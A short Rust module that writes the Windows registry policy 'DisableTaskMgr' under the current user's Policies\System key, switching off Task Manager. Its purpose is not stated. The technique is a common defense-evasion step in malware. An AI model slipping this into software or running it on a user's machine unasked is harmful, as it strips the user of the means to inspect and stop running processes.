pub mod task_manager {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;

    pub fn disable_task_manager(){
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        let (key, _disp) = hkcu.create_subkey(path).unwrap();

        key.set_value("DisableTaskMgr", &1u32).unwrap();
    }
}